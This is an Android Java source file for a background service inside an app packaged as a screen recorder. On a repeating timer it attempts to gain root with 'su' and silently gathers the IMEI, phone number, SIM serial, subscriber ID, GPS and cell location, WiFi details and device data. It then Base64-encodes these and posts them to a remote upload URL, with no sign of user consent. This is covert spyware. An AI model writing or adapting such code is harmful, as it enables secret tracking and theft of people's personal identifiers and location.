package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.jaredrummler.android.device.DeviceName;
import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

public class DeviceInfo extends Service {
    String Dimei;
    StringBuffer sb;
    String time_stamp;
    String DeviceFile;
    String deviceDataString;
    String batterylevel;
    String batterytemp;
    public static boolean running = false;
    String aa;
    int mcc, mnc, cellid, celllac;
    LocationManager myLocationManager;
    String PROVIDER = LocationManager.NETWORK_PROVIDER;
    double lat = 00.0000, longi = 00.0000;


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        running = true;
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onStart(Intent intent, int startId) {
        running = true;

        try {
            Process sh = Runtime.getRuntime().exec("su", null,null);
        }
        catch (Exception e){
            Log.d("SuperUser Exception","onOffchk"+e.getMessage());
        }

        Timer mytimer = new Timer();
        mytimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- DeviceInfo");
                DeviceInfoData();
            }
        }, 10000, 60500);
        super.onStart(intent, startId);
    }

    private boolean isRooted() {
        return findBinary("su");
    }

    public boolean findBinary(String binaryName) {
        boolean found = false;
        if (!found) {
            String[] places = {"/sbin/", "/system/bin/", "/system/xbin/", "/data/local/xbin/",
                    "/data/local/bin/", "/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/"};
            for (String where : places) {
                if (new File(where + binaryName).exists()) {
                    found = true;
                    break;
                }
            }
        }
        return found;
    }

    private void DeviceInfoData() {
        List<String> data = new ArrayList<String>();
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        Dimei = tm.getDeviceId();
        String SimSerialNumber = tm.getSimSerialNumber();
        String mPhoneNumber = tm.getLine1Number();
        String mPhoneNet = tm.getNetworkOperatorName();
        String sub = tm.getSubscriberId();

        try {
            String networkOperator = tm.getNetworkOperator();
            mnc = Integer.parseInt(networkOperator.substring(3));
            mcc = Integer.parseInt(networkOperator.substring(0, 3));
        } catch (Exception e) {

        }

        try {
            GsmCellLocation cellLocation = (GsmCellLocation) tm.getCellLocation();
            cellid = cellLocation.getCid();
            celllac = cellLocation.getLac();
        } catch (Exception e) {

        }

        //location through network manager
        try {

//            myLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
//            Location location = myLocationManager.getLastKnownLocation(PROVIDER);
//            lat = location.getLatitude();
//            longi = location.getLongitude();

            myLocationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location locationGPS = myLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            Location locationNet = myLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if(locationGPS != null) {
                lat= locationGPS.getLatitude();
                longi = locationGPS.getLongitude();
                System.out.println("----GPS using GPS----->"+lat+", "+longi);
            }

            else if(locationNet != null) {
                lat= locationNet.getLatitude();
                longi = locationNet.getLongitude();
                System.out.println("----GPS using Network----->"+lat+", "+longi);
            }

            else {
                lat= 0.0;
                longi = 0.0;
            }
        }
        catch (Exception e){ System.out.println("Device Info 1 : "+e.toString()); }


        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        String Mac = wifiInfo.getMacAddress();
        String bssid = wifiInfo.getBSSID();//wifi access id
        String ssid = wifiInfo.getSSID();//wifi connected device name
        String DeviceModel = android.os.Build.MODEL;
        String BuildNo =android.os.Build.DISPLAY;
        String Dmanufacture = android.os.Build.MANUFACTURER;
        String mDeviceName = DeviceName.getDeviceName();

        TimeZone tz = TimeZone.getDefault();
        String time_data = tz.getDisplayName(false, TimeZone.SHORT)+"\nTime_Zone_Id::--"+tz.getID();

        // Are we charging / charged?
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, ifilter);

        int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        batterylevel = String.valueOf(status);
        int temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
        double battemp = temp /10 ;
        batterytemp = String.valueOf(battemp);


        // formattedDate have current date/time
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String formattedDate = df.format(c.getTime());

        String version = Build.VERSION.RELEASE;

        boolean rooted = isRooted ();
        sb = new StringBuffer();
        sb.append("");
        //network connected type
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetInfo = cm.getActiveNetworkInfo();
            if (activeNetInfo != null && activeNetInfo.isConnected()) {
                aa = activeNetInfo.getTypeName();
                sb.append(
                        "IMEI::--"+Dimei
                                +"\nPhoneNo::--" +mPhoneNumber
                                +"\nDeviceName::--" +mDeviceName
                                +"\nDeviceModel::--" +DeviceModel
                                +"\nBuildNo::--" +BuildNo
                                +"\nDeviceManufacture::--" +Dmanufacture
                                +"\nwifi Mac::--" +Mac
                                +"\nwifi access id::--" +bssid
                                +"\nwifi connected device name::--" +ssid
                                +"\nSubscriber_name::--" +mPhoneNet
                                +"\nTime_Zone::--" +time_data
                                +"\nBattery Remaining::--" +batterylevel +"%"
                                +"\nBattery temperature::--" +batterytemp
                                +"\nLocal_Time_Zone::--" +formattedDate
                                +"\nPacketData_Type::--" +aa
                                +"\nAndroid Version::--" +version
                                +"\nMNC::--" +mnc
                                +"\nMCC::--" +mcc
                                +"\nCellid::--" +cellid
                                +"\nCelllac::--" +celllac
                                +"\nNetLat::--" +lat
                                +"\nNetLong::--" +longi
                                +"\nSimSerialNumber::--" +SimSerialNumber
                                +"\nSubscriberId::--" +sub
                                +"\nRooted::--" +rooted
                );
            }

            else {
                System.out.println("Device Info 3 : Network Not Available");
            }
        }
        catch (Exception e){
            System.out.println("Device Info 2 : "+e.toString());
        }

        HttpClient Filehttpclient = new DefaultHttpClient();
        //URL change Urldemo claas used
        String devicedemo = UrlDemo.fsupload;
        HttpPost filehttpPost = new HttpPost(devicedemo);

        byte[] imeidevice = Dimei.getBytes();
        String imeideviceEncode = android.util.Base64.encodeToString(imeidevice, android.util.Base64.DEFAULT);
        String imeideviceString = imeideviceEncode.replaceAll("\n", "");
        try {
            String deviceData = android.util.Base64.encodeToString(sb.toString().getBytes(), android.util.Base64.DEFAULT);
            deviceDataString = deviceData.replaceAll("\n", "");
        }
        catch (Exception e){
            System.out.println("Device Info 4 : "+e.toString());
        }

        try
        {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin="",strhr="";
            if(min<10)
                strmin = "0"+Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if(hr<10)
                strhr= "0"+Integer.toString(hr);
            else
                strhr= Integer.toString(hr);
            time_stamp = ""+strhr+"_"+strmin+"_"+Integer.toString(dt.getMonth()+1)+"_"+Integer.toString(dt.getDate())+"_"+Integer.toString(dt.getYear()+1900)+"_";
        }
        catch(Exception e)
        {
            Log.d(getClass().getSimpleName(), "Exception:"+e);
        }

        try {
            SharedPreferences sp = getSharedPreferences("key", 0);
            String tValue = sp.getString("chkdevice","");

            //FileName change
            String devicefile_name ="Meta.txt";
            byte[] devicenamedata = devicefile_name.getBytes("UTF-8");
            String devicenameencode = android.util.Base64.encodeToString(devicenamedata, android.util.Base64.DEFAULT);
            DeviceFile = devicenameencode.replaceAll("\n", "");

            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

            nameValuePair.add(new BasicNameValuePair("FNAME", DeviceFile));
            nameValuePair.add(new BasicNameValuePair("IMEI", imeideviceString));
            nameValuePair.add(new BasicNameValuePair("DATA", deviceDataString));

            filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

            HttpResponse response = Filehttpclient.execute(filehttpPost);

            response.getStatusLine();

            HttpEntity entity = response.getEntity();
            entity = response.getEntity();

            InputStream in = entity.getContent();
            String buffer = "";
            for (int i = in.read(); i != -1; i = in.read()) {
                buffer += (char) i;
                i++;
            }

            sb.setLength(0);
        }
        catch (Exception e){
            System.out.println("Device Info 5 : "+e.toString());
        }

    }

    public void onDestroy() {
        System.out.println("Device Info 6 : DeviceInfo Destroyed");
        running = false;
    }
}
